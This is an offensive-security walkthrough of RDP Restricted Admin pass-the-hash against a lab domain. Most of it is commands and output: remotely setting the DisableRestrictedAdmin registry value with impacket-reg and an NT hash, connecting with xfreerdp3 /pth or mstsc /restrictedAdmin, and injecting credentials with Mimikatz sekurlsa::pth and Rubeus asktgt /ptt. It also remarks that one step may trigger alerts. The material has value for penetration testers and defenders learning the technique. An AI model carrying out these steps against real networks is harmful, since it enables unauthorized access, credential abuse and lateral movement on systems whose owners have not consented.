# RDP

## Restricted Admin

The RDP restricted admin mode allows an user to connect to RDP without sending
its password, just through NTLM or Kerberos auth. Therefore, when "Restricted
Admin" is enable, it is possible to perform a Pass The Hash over RDP.

For "Restricted Admin" to being enabled, the `DisableRestrictedAdmin` value of the
`HKLM\System\CurrentControlSet\Control\Lsa` registry key must be 0.

Here is an example of the "Restricted Admin" enabled:
```
C:\> reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
    DisableRestrictedAdmin    REG_DWORD    0x0
```

In case the `DisableRestrictedAdmin` value is 1 or is not present, the
"Restricted Admin" mode is disabled.

### Restricted Admin PtH from GNU/Linux

Check restricted admin:
```
$ impacket-reg hack.lab/Administrator@dc01.hack.lab \
-hashes :AC1DBEF8523BAFECE1428E067C1B114F \
query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' \
-v DisableRestrictedAdmin
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

HKLM\System\CurrentControlSet\Control\Lsa
[-] RRP SessionError: code: 0x2 - ERROR_FILE_NOT_FOUND - The system cannot find the file specified.
```

Enable restricted admin mode:
```
$ impacket-reg hack.lab/Administrator@dc01.hack.lab \
-hashes :AC1DBEF8523BAFECE1428E067C1B114F \
add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' \
-v DisableRestrictedAdmin -vt REG_DWORD -vd 0
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Successfully set
	key	HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin
	type	REG_DWORD
	value	0
```

Connect with RDP with restricted admin:
```
xfreerdp3 /v:192.168.122.125 /u:Administrator /pth:AC1DBEF8523BAFECE1428E067C1B114F
```

To disable the restricted admin mode:
```
$ impacket-reg hack.lab/Administrator@dc01.hack.lab \
-hashes :AC1DBEF8523BAFECE1428E067C1B114F \
delete -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' \
-v DisableRestrictedAdmin
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Successfully deleted key HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin
```

### Restricted Admin PtH from Windows

In order to perform a PtH from Windows we need to inject a credential into our
session, we can inject the NTLM hash or a Kerberos ticket (requested with the
hash).

In case we want to proceed directly by injecting the hash, we can use Mimikatz
`sekurlsa::pth` command. Here is an example that runs a powershell terminal from
which we can execute the rest of the attack:
```
C:\> .\mimikatz.exe "sekurlsa::pth /domain:hack.lab /user:Administrator /rc4:AC1DBEF8523BAFECE1428E067C1B114F /run:powershell" "exit"
```

Alternatively, we can use the NT hash to request a Kerberos ticket, and inject
that ticket in our current session. **Warning**: Requesting kerberos tickets
with NT hash may raise some alerts.

We can request and inject a Kerberos ticket with Rubeus `asktgt` command and the
`/ptt` option:
```
C:\> .\Rubeus.exe asktgt /user:Administrator /domain:hack.lab /rc4:AC1DBEF8523BAFECE1428E067C1B114F /ptt
```

We can use `reg query` to check if "Restricted Admin" is enabled in the target system:
```
C:\> reg query "\\dc01.hack.lab\HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin


ERROR: The system was unable to find the specified registry key or value.
```

If some error relating to registry service is returned, we can enable the remote
registry service with this command:
```
C:\> sc.exe \\<machine> start RemoteRegistry
```

In case "Restricted Admin" is not enable, we can use `reg add` to enable it:
```
C:\> reg add "\\dc01.hack.lab\HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0
The operation completed successfully.
```

And then connect with `mstsc /restrictedAdmin`:
```
mstsc.exe /restrictedAdmin /v:dc01.hack.lab
```

Finally, to disable it we can just delete the value with `reg delete`:
```
C:\> reg delete "\\dc01.hack.lab\HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /f
The operation completed successfully.
```

Resources:
- [Remote Desktop Services: Enable Restricted Admin mode](https://learn.microsoft.com/en-us/archive/technet-wiki/32905.remote-desktop-services-enable-restricted-admin-mode)
